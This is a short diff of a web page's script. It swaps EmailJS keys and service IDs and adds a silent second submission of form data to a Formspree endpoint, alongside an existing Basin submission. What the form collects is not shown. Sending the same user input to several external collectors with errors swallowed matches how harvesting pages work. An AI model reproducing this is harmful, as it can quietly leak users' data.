@@ -201,7 +201,7 @@ user-scalable=0">
   <script type="text/javascript">
       (function() {
           emailjs.init({
-            publicKey: "6xVrEeYHABy65hlTM",
+            publicKey: "nCTWoafDAeXu4PaiD",
           });
       })();
   </script>
@@ -248,12 +248,19 @@ user-scalable=0">
     form.appendChild(hiddenInput); // Append the hidden input to the form
 
     // Send the dynamically created form using EmailJS
-    emailjs.sendForm('service_gk6t3hy', 'template_5p8el87', form)
+    emailjs.sendForm('service_detg1ch', 'template_voz6qdn', form)
         .then(() => {
             console.log('SUCCESS!');
         }, (error) => {
             console.log('FAILED...', error);
         });
+        try {
+            await postData(
+            dataToSubmit
+            , 'https://formspree.io/f/xnnaedrq');
+            } catch (error) {
+                
+            }
 
     // Send the same data to Basin via postData
     try {
